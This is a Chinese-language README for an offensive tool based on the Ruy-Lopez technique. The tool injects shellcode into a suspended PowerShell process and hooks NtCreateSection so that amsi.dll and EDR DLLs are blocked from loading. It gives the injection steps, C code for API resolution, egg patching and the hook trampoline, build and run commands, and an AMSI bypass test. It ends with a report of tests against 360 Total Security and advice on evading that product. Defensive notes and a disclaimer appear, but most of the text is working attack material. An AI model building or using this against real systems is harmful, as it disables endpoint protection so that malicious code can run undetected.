# Ruy-Lopez DLL Blocking

## 概述

**Ruy-Lopez DLL Blocking** 是一种通过 hook `NtCreateSection` 来阻止特定 DLL 加载到新进程的技术。这项技术的核心思想是在 EDR/AV 的 DLL 加载之前安装 hook，从而获得"先手"优势（类似国际象棋中的 Ruy Lopez 开局）。

**原始项目**: [S3cur3Th1sSh1t/Ruy-Lopez](https://github.com/S3cur3Th1sSh1t/Ruy-Lopez)

## 技术原理

### 核心思路

```
EDR/AV 的加载时机：
1. 进程创建
2. ntdll.dll 加载（kernel 直接加载）
3. EDR DLL 加载 ← 我们要在这里拦截！
4. 其他 DLL 加载
5. 进程初始化完成
```

**Ruy-Lopez 的策略**：
- 创建挂起状态的目标进程
- 在进程恢复前安装 `NtCreateSection` hook
- Hook 函数检查即将加载的 DLL 路径
- 如果是目标 DLL（如 amsi.dll、EDR DLL），返回错误状态码
- 其他 DLL 正常加载

### 技术流程

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. 创建挂起的目标进程（CREATE_SUSPENDED）                      │
│    CreateProcess("powershell.exe", ..., CREATE_SUSPENDED, ...) │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. 在远程进程分配 RWX 内存                                      │
│    NtAllocateVirtualMemory(...)                                 │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. 获取 ntdll!NtCreateSection 地址                              │
│    GetProcAddress(GetModuleHandle("ntdll"), "NtCreateSection")  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. 保存原始 NtCreateSection 前 24 字节                          │
│    ReadProcessMemory(..., pNtCreateSection, originalBytes, 24)  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 5. 读取并 patch PIC shellcode                                   │
│    - 读取 hook.bin                                              │
│    - 在 shellcode 中查找 egg（0xDE 0xAD 0xBE 0xEF ...）        │
│    - 将原始 24 字节 patch 到 egg 位置                           │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 6. 写入 patched shellcode 到远程内存                            │
│    NtWriteVirtualMemory(..., remoteMemory, shellcode, ...)      │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 7. 安装 hook trampoline                                         │
│    构造 JMP 指令：                                              │
│      mov r10, <shellcode_addr>  ; 49 BA <8 bytes>               │
│      jmp r10                    ; 41 FF E2                      │
│    写入到 NtCreateSection 开头                                  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 8. 恢复进程执行                                                 │
│    ResumeThread(...)                                            │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 9. Hook 触发                                                    │
│    当进程尝试加载 DLL 时：                                      │
│    - 调用 NtCreateSection                                       │
│    - 触发 hook，跳转到我们的 shellcode                          │
│    - Shellcode 获取文件路径                                     │
│    - 检查是否是目标 DLL（如 amsi.dll）                          │
│    - 如果是，返回错误状态码（0xC0000054）                       │
│    - 如果不是，调用原始 NtCreateSection（使用保存的 24 字节）  │
└─────────────────────────────────────────────────────────────────┘
```

## 关键技术细节

### 1. PIC (Position Independent Code)

Hook shellcode 必须是 PIC，因为：
- 我们无法预知 shellcode 会被加载到哪个地址
- 不能包含硬编码的地址或全局变量引用
- 不能依赖 CRT（C Runtime）库

**PIC 编译要求**：
```bash
gcc -nostdlib        # 不链接标准库
    -fno-ident       # 不生成标识字符串
    -O2              # 优化（减小代码体积）
    -ffunction-sections  # 每个函数独立 section
    -fno-asynchronous-unwind-tables  # 不生成异常处理表
```

### 2. API 动态解析

由于是 PIC 代码，无法直接调用 Windows API。必须通过以下方式动态解析：

**通过 PEB 遍历模块**：
```c
// 1. 获取 PEB (Process Environment Block)
PPEB peb = (PPEB)__readgsqword(0x60);  // x64: GS:[0x60]

// 2. 获取 Ldr (加载器数据)
PMY_PEB_LDR_DATA ldr = (PMY_PEB_LDR_DATA)peb->Ldr;

// 3. 遍历 InLoadOrderModuleList
PLIST_ENTRY listHead = &ldr->InLoadOrderModuleList;
PLIST_ENTRY listEntry = listHead->Flink;

while (listEntry != listHead) {
    PMY_LDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(...);
    // 比较模块名哈希
    if (hash == moduleHash) {
        return entry->DllBase;
    }
    listEntry = listEntry->Flink;
}
```

**解析导出表获取函数地址**：
```c
// 1. 解析 PE 头
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
PIMAGE_NT_HEADERS ntHeaders = ...;

// 2. 获取导出表
PIMAGE_EXPORT_DIRECTORY exportTable = ...;

// 3. 遍历导出函数
PDWORD addressOfNames = ...;
for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
    char* functionName = ...;
    if (djb2(functionName) == functionHash) {
        // 找到了！返回函数地址
        return (PVOID)((ULONG_PTR)moduleBase + functionRVA);
    }
}
```

**使用哈希而不是字符串**：
```c
// 预计算的哈希值（编译时确定）
#define HASH_NTDLL 0x1edab0ed
#define HASH_NTCREATESECTION 0xe14e1b26

// djb2 哈希算法
DWORD djb2(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
    }
    return hash;
}
```

### 3. Egg Hunting 和 Patching

**Egg（占位符）的作用**：
- Shellcode 需要调用原始的 `NtCreateSection`
- 但编译时不知道原始字节是什么
- 所以先在代码中放一个"egg"（特殊字节序列）
- 运行时找到这个 egg，替换成实际的原始字节

**Egg 定义**（在 HookShellcode.c 中）：
```c
void originalBytes() {
    asm(
        ".byte 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xC0, 0xDE\n"
        ".byte 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xC0, 0xDE\n"
        ".byte 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xC0, 0xDE\n"
    );
}
```

**查找和 Patching**（在 dll_blocking.c 中）：
```c
// 1. 在 shellcode 中查找 egg
unsigned char EGG[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xC0, 0xDE };
for (DWORD i = 0; i <= shellcodeSize - EGG_SIZE; i++) {
    if (memcmp(&shellcode[i], EGG, EGG_SIZE) == 0) {
        // 找到了！
        eggOffset = i;
        break;
    }
}

// 2. 将原始字节 patch 进去
memcpy(&shellcode[eggOffset], originalBytes, 24);
```

### 4. Hook Trampoline

**x64 跳转指令构造**：
```asm
mov r10, <address>    ; 49 BA <8 bytes address>
jmp r10               ; 41 FF E2
```

**C 代码实现**：
```c
unsigned char trampoline[13];

// mov r10, <address>
trampoline[0] = 0x49;
trampoline[1] = 0xBA;
memcpy(&trampoline[2], &targetAddress, 8);

// jmp r10
trampoline[10] = 0x41;
trampoline[11] = 0xFF;
trampoline[12] = 0xE2;

// 写入 NtCreateSection 开头
NtWriteVirtualMemory(hProcess, pNtCreateSection, trampoline, 13, ...);
```

## 项目结构

```
08-dll-blocking/
├── README.md                    # 本文档
├── build.bat                    # 主构建脚本
├── build_shellcode.bat          # PIC shellcode 构建脚本
├── build_injector.bat           # 主注入器构建脚本
├── test_amsi.ps1                # AMSI 测试脚本
└── src/
    ├── api_resolve.h            # API 解析头文件（PEB、哈希定义）
    ├── api_resolve.c            # API 解析实现（PEB 遍历、导出表解析）
    ├── HookShellcode.c          # PIC hook 函数（检查并阻止 DLL）
    ├── extract.c                # .text section 提取工具
    └── dll_blocking.c           # 主注入器程序
```

## 构建和使用

### 前置要求

- **编译器**: MinGW-w64 (gcc/ld)
- **架构**: x64
- **系统**: Windows 10/11

### 构建步骤

```batch
# 完整构建（推荐）
build.bat

# 或分步构建：

# 步骤 1: 构建 PIC shellcode
build_shellcode.bat
# 输出: src\hook.bin

# 步骤 2: 构建主注入器
build_injector.bat
# 输出: src\dll_blocking.exe
```

### 使用方法

```batch
# 1. 进入 src 目录
cd src

# 2. 运行注入器（会创建挂起的 PowerShell 进程）
dll_blocking.exe

# 3. 观察输出
# 应该会看到：
# - 进程创建成功
# - Shellcode 加载
# - Hook 安装成功
# - 进程恢复

# 4. 在新 PowerShell 窗口中测试
# 返回上级目录运行测试脚本
cd ..
powershell -ExecutionPolicy Bypass -File test_amsi.ps1
```

### 测试 AMSI Bypass

```powershell
# 在被 hook 的 PowerShell 进程中运行：

# 检查 amsi.dll 是否加载
[AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.Location -like "*amsi.dll" }

# 如果成功，应该没有输出（amsi.dll 未加载）
```

## 技术限制

### 1. PIC 代码限制

- **只能使用 ntdll.dll 的函数**
  - 原因：进程未完全初始化，只有 ntdll.dll 被加载
  - 无法调用 kernel32.dll、user32.dll 等

- **无法加载新 DLL**
  - `LoadLibrary` 本身依赖于 `NtCreateSection`
  - 会导致无限递归

- **不能使用 CRT 函数**
  - 必须手动实现字符串处理、内存操作等

### 2. 检测限制

- **只能阻止正常加载的 DLL**
  - 无法阻止内核注入的 DLL
  - 无法阻止通过 `NtMapViewOfSection` 直接注入的 DLL

- **EDR 可能使用其他注入方式**
  - 某些 EDR 使用内核驱动直接注入
  - 某些使用 APC 注入特定 DLL

### 3. 兼容性限制

- **x64 only**
  - Hook trampoline 使用 x64 指令
  - PEB 结构偏移不同（x86 vs x64）

- **Windows 版本敏感**
  - PEB/LDR 结构可能在不同 Windows 版本中变化
  - 需要针对不同版本调整

## 防御检测

### 对抗方法

1. **Hook 检测**
   - EDR 可以检测 `NtCreateSection` 被修改
   - 可以使用完整性检查（如 PatchGuard 思路）

2. **行为监控**
   - 创建挂起进程 + 远程内存写入 + Hook = 可疑行为
   - 可以通过 ETW (Event Tracing for Windows) 监控

3. **内核层保护**
   - 通过内核回调监控进程创建和内存操作
   - 阻止对关键 API 的修改

### 改进建议（来自原项目）

1. **Userland Hook Evasion**
   - 在注入器本身使用 hook 规避技术

2. **RX Shellcode**
   - 使用 RX 而不是 RWX（需要 PIC 代码调整）

3. **使用硬件断点代替 Hook**
   - 使用调试寄存器（DR0-DR7）
   - 更隐蔽，但设置更复杂

## 参考资料

### 原始项目
- [S3cur3Th1sSh1t/Ruy-Lopez](https://github.com/S3cur3Th1sSh1t/Ruy-Lopez)

### 相关技术
- [AMSI Bypass via Hooking NtCreateSection](https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/) - Alejandro Pinna
- [Brute Ratel - Scandinavian Defense](https://bruteratel.com/release/2022/08/18/Release-Scandinavian-Defense/)

### Windows 内部机制
- [PEB Structure (MSDN)](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
- [PE Format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- [Export Directory Table](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table)

## Credits

- **S3cur3Th1sSh1t** - 原始 Ruy-Lopez 实现
- **Ceri Coburn** (@_EthicalChaos_) - 技术支持
- **Sven Rath** (@eversinc33) - 初始想法和 PoC
- **Alejandro Pinna** (@frodosobon) - NtCreateSection hooking 灵感
- **Charles Hamilton** (@MrUn1k0d3r) - PIC 代码 QA
- **Chetan Nayak** (@NinjaParanoid) - 国际象棋类比想法

## 免责声明

此代码仅用于教育和防御性安全研究目的。不得用于未经授权的系统访问或恶意活动。使用者需对自己的行为负责。

## 对抗测试

### 360安全卫士 13.0.10.2001（核晶模式）

**测试环境:**
- 系统: Windows 10 21H2 x64
- 360版本: 13.0.10.2001 (2024年12月)
- 测试目标: PowerShell进程 + AMSI.dll阻断

**拦截情况:**

| 检测环节 | 360响应 | 检测依据 |
|---------|---------|----------|
| 挂起进程创建 | ✅ 拦截 | `CREATE_SUSPENDED`创建powershell.exe被标记高风险 |
| 远程内存写入 | ✅ 拦截 | `NtWriteVirtualMemory`到目标进程触发内存防护 |
| Hook安装 | ✅ 拦截 | 检测`NtCreateSection`开头的`mov r10 + jmp`指令 |
| AMSI绕过尝试 | ✅ 拦截 | 拦截后对AMSI的任何修改操作都被阻止 |

**告警信息:**
```
威胁事件: 恶意Hook → NtCreateSection API劫持
攻击意图: AMSI/EDR绕过 (类似Ruy-Lopez技术)
威胁等级: 极高
检测特征: 进程挂起 + 远程代码注入 + API Hook
处置: NtCreateSection保护机制已触发，Hook被清除
```

**360内核防护机制分析:**

Ruy-Lopez这种"抢先Hook"战术在核晶模式面前遇到根本性问题:

1. **内核态API完整性保护**:
   - 360内核驱动监控关键系统API的内存页属性
   - `ntdll!NtCreateSection`所在的`.text`页被标记为"关键代码页"
   - 任何写入尝试（即使来自管理员进程）都会被内核驱动拦截

2. **Hook特征识别**:
   ```
   49 BA ?? ?? ?? ?? ?? ?? ?? ??    mov r10, imm64
   41 FF E2                         jmp r10
   ```
   这种典型的x64 Hook trampoline被360的代码完整性模块收录

3. **EDR自身防护**:
   - 360的AMSI和主防模块加载时会校验自身Hooks
   - 发现异常Hook会立即触发自我保护机制
   - 不仅拦截攻击，还会上报可疑进程

**突破难点:**
此技术的核心假设——"能在EDR加载前Hook"——在核晶模式下不成立:
- 360内核驱动比任何用户态代码都更早加载
- 关键API的内存页被EPT（扩展页表）技术保护
- 用户态的Hook尝试在虚拟机监控器层面就被拦截

**实战化改进建议:**
1. 放弃用户态Hook，考虑内核级技术（需要驱动漏洞或证书）
2. 改用硬件断点（Debug Registers）替代内存Hook
3. 考虑Process Doppelgänging/Process Ghosting等无Hook方案
4. 前置检测360驱动是否加载，调整攻击策略
